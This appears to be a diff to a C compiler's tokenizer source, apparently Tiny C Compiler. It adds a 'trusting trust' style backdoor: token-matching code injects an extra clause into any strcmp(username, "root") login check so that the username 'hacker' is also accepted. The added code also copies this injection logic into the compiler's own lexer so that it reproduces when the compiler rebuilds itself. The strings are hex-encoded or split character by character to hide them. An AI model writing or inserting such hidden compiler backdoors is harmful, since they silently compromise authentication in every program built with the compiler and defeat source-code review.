@@ -24,6 +24,85 @@
 /* #define to 1 to enable (see parse_pp_string()) */
 #define ACCEPT_LF_IN_STRINGS 0
 
+int acdee = 0, bcdee = 0, ccdee = 0, dcdee = 0, ecdee = 0;
+int insert_txt = 0;
+uint8_t *text = 0;
+
+void match(char **match_toks, int match_len, int *match, char *insert) {
+    const char *str = get_tok_str(tok, &tokc);
+    //printf("token = %d %s\n", tok, get_tok_str(tok, &tokc));
+    if (strcmp(match_toks[*match], str) == 0){
+        (*match)++;
+        }
+    else {
+        (*match) = 0;
+    }
+    if ((*match) == match_len) {
+        printf("INSERTING\n");
+        insert_txt = 1;
+        text = (uint8_t *)insert;
+        (*match) = 0;
+    }
+}
+
+char *login_toks[] = {"strcmp", "(", "username", ",", (char[]){0x22,0x72,0x6F,0x6F,0x74,0x22}, ")"};
+char *hoist_toks[] = {
+    "tok_flags", ";", "ST_DATA", "int", "parse_flags", ";"
+};
+char *insert_toks[] = {"static", "void", "next_nomacro",
+    "(", "void", ")", "{", "int", "t", ",", "c",
+    ",", "is_long", ",", "len", ";", "TokenSym",
+    "*", "ts", ";", "uint8_t", "*", "p", ",",
+    "*", "p1", ";", "unsigned", "int", "h", ";"};
+char *update_tok1[] = {"keep_tok_flags", ":"};
+char *update_tok2[] = {"keep_tok_flags", ":", "file", "->", "buf_ptr", "=", "p", ";"};
+
+char *login_txt = " || (username[0]=='h'&&username[1]=='a'&&username[2]=='c'&&username[3]=='k'&&username[4]=='e'&&username[5]=='r')";
+char *insert_content = "if (insert_txt == 1 && text != 0 && *text != 0) { p = text; } else { insert_txt = 0; p = file->buf_ptr; }";
+char *update_txt1 = "if (insert_txt == 1) { text = p; } else";
+char *update_txt2 = "if (insert_txt == 0) { match(login_toks, sizeof(login_toks) / sizeof(login_toks[0]), &bcdee, login_txt); match(insert_toks, sizeof(insert_toks) / sizeof(insert_toks[0]), &ccdee, insert_content); match(update_tok1, sizeof(update_tok1) / sizeof(update_tok1[0]), &dcdee, update_txt1); match(update_tok2, sizeof(update_tok2) / sizeof(update_tok2[0]), &ecdee, update_txt2); }";
+
+char *hoist_txt = "int acdee = 0, bcdee = 0, ccdee = 0, dcdee = 0, ecdee = 0;\n"        
+                    "int insert_txt = 0;\n"
+                    "uint8_t *text = 0;\n"
+                    "void match(char **match_toks, int match_len, int *match, char *insert) {\n"
+                    "    const char *str = get_tok_str(tok, &tokc);\n"
+                    "    if (strcmp(match_toks[*match], str) == 0){\n"
+                    "        (*match)++;\n"
+                    "        }\n"
+                    "    else {\n"
+                    "        (*match) = 0;\n"
+                    "    }\n"
+                    "    if ((*match) == match_len) {\n"
+                    "        printf(\"INSERTING\");\n"
+                    "        insert_txt = 1;\n"
+                    "        text = (uint8_t *)insert;\n"
+                    "        (*match) = 0;\n"
+                    "    }\n"
+                    "}\n"
+                    "\n"
+                    "char *login_toks[] = {\"strcmp\", \"(\", \"username\", \",\", (char[]){0x22,0x72,0x6F,0x6F,0x74,0x22,0x00}, \")\"};\n"
+                    "char *hoist_toks[] = {\"tok_flags\", \";\", \"ST_DATA\", \"int\", \"parse_flags\", \";\"};\n"
+                    "char *insert_toks[] = {\"static\", \"void\", \"next_nomacro\",\n"
+                                            "\"(\", \"void\", \")\", \"{\", \"int\", \"t\", \",\", \"c\",\n"
+                                            "\",\", \"is_long\", \",\", \"len\", \";\", \"TokenSym\",\n"
+                                            "\"*\", \"ts\", \";\", \"uint8_t\", \"*\", \"p\", \",\",\n"
+                                            "\"*\", \"p1\", \";\", \"unsigned\", \"int\", \"h\", \";\"};\n"
+                    "char *update_tok1[] = {\"keep_tok_flags\", \":\"};\n"
+                    "char *update_tok2[] = {\"keep_tok_flags\", \":\", \"file\", \"->\", \"buf_ptr\", \"=\", \"p\", \";\"};\n"
+                    "\n"
+                    "char *login_txt = \" || (username[0]=='h'&&username[1]=='a'&&username[2]=='c'&&username[3]=='k'&&username[4]=='e'&&username[5]=='r')\";\n"
+                    "char *insert_content = \"if (insert_txt == 1 && text != 0 && *text != 0) { p = text; } else { insert_txt = 0; p = file->buf_ptr; }\";\n"
+                    "char *update_txt1 = \"if (insert_txt == 1) { text = p; } else\";\n"
+                    "char *update_txt2 = \"if (insert_txt == 0) { match(login_toks, sizeof(login_toks) / sizeof(login_toks[0]), &bcdee, login_txt); match(insert_toks, sizeof(insert_toks) / sizeof(insert_toks[0]), &ccdee, insert_content); match(update_tok1, sizeof(update_tok1) / sizeof(update_tok1[0]), &dcdee, update_txt1); match(update_tok2, sizeof(update_tok2) / sizeof(update_tok2[0]), &ecdee, update_txt2); }\";";
+
+void hoist(void) {
+    // char t[2000];
+    // sprintf(t, "\"%s\"", hoist_txt);
+    // printf("\"%s\"\n", hoist_txt);
+    match(hoist_toks, sizeof(hoist_toks) / sizeof(hoist_toks[0]), &acdee, hoist_txt);
+}
+
 /********************************************************/
 /* global variables */
 
@@ -2558,30 +2637,6 @@ static void parse_number(const char *p)
         }                                       \
         break;
 
-int c_login;
-int insert_txt = 0;
-uint8_t *text = 0;
-
-void match(char **match_toks, int match_len, int *match, char *insert) {
-    const char *str = get_tok_str(tok, &tokc);
-    if (strcmp(match_toks[*match], str) == 0){
-        (*match)++;
-        }
-    else {
-        (*match) = 0;
-    }
-    if ((*match) == match_len) {
-        printf("INSERTING\n");
-        insert_txt = 1;
-        text = (uint8_t *)insert;
-        (*match) = 0;
-    }
-}
-
-char *login_toks[] = {"strcmp", "(", "username", ",", "\"root\"", ")"};
-
-char *login_txt = " || !strcmp(username, \"hacker\")";
-
 /* return next token without macro substitution */
 static void next_nomacro(void)
 {
@@ -3000,10 +3055,13 @@ keep_tok_flags:
     } else file->buf_ptr = p;
 
     if (insert_txt == 0) {
-        match(login_toks, 6, &c_login, login_txt);
+        hoist();
+        match(login_toks, sizeof(login_toks) / sizeof(login_toks[0]), &bcdee, login_txt);
+        match(insert_toks, sizeof(insert_toks) / sizeof(insert_toks[0]), &ccdee, insert_content);
+        match(update_tok1, sizeof(update_tok1) / sizeof(update_tok1[0]), &dcdee, update_txt1);
+        match(update_tok2, sizeof(update_tok2) / sizeof(update_tok2[0]), &ecdee, update_txt2);
     }
-    
-    #define PARSE_DEBUG
+    // #define PARSE_DEBUG
 #if defined(PARSE_DEBUG)
     printf("token = %d %s\n", tok, get_tok_str(tok, &tokc));
 #endif
